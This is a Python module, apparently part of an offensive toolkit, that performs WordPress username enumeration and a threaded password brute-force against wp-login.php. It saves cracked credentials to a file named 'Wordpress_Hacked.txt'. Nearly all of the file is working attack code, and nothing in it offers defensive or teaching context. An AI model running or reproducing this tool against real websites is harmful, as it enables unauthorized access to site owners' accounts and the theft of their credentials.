# coding=utf-8
import requests, re, threading, time, json
from Exploits import printModule
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
passwords = open('files/DefaultPasswords_Wordpress.txt', 'r').read().splitlines()


class Wordpress(object):
    def __init__(self):
        self.flag = 0
        self.password = passwords

    def Run(self, site):
        try:
            Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            source = requests.get('http://' + site + '/wp-login.php', timeout=10, headers=Headers).content
            WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', str(source))[0]
            WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', str(source))[0]
            if 'Log In' in WpSubmitValue:
                WpSubmitValue = 'Log+In'
            else:
                WpSubmitValue = WpSubmitValue
            thread = []
            usernameWp = self.UserName_Enumeration(site)
            if usernameWp == None:
                username = 'admin'
            else:
                username = usernameWp
            for passwd in self.password:
                t = threading.Thread(target=self.BruteForce,
                                     args=(site, passwd, WpSubmitValue, WpRedirctTo, username))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                return printModule.returnNo(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')
            else:
                return printModule.returnYes(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')

        except:
            return printModule.returnNo(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')

    def UserName_Enumeration(self, site):
        Headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        _cun = 1
        Flag = True
        __Check2 = requests.get('http://' + site + '/?author=1', timeout=10, headers=Headers)
        try:
            while Flag:
                GG = requests.get('http://' + site + '/wp-json/wp/v2/users/' + str(_cun),
                                  timeout=10, headers=Headers)
                __InFo = json.loads(str(GG.text))
                if 'id' not in str(__InFo):
                    Flag = False
                else:
                    Usernamez = __InFo['slug']
                    return Usernamez
                break
        except:
            try:
                if '/author/' not in str(__Check2.text):
                    return None
                else:
                    find = re.findall('/author/(.*)/"', str(__Check2.text))
                    username = find[0]
                    if '/feed' in str(username):
                        find = re.findall('/author/(.*)/feed/"', str(__Check2.text))
                        username2 = find[0]
                        return username2
                    else:
                        return username
            except requests.exceptions.ReadTimeout:
                return None

    def BruteForce(self, site, passwd, WpSubmitValue, WpRedirctTo, username):
        try:
            sess = requests.session()
            Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            post = {}
            post['log'] = username
            post['pwd'] = passwd
            post['wp-submit'] = WpSubmitValue
            post['redirect_to'] = WpRedirctTo
            post['testcookie'] = 1
            url = site + '/wp-login.php'
            GoT = sess.post('http://' + url, data=post, headers=Headers, timeout=10)
            if 'wordpress_logged_in_' in str(GoT.cookies) or 'action=logout' in str(GoT.text):
                with open('result/Wordpress_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/wp-login.php' + '\n Username: {}'.format(username) +
                                 '\n Password: ' +
                                 passwd + '\n-----------------------------------------\n')
                self.flag = 1
        except:
            pass
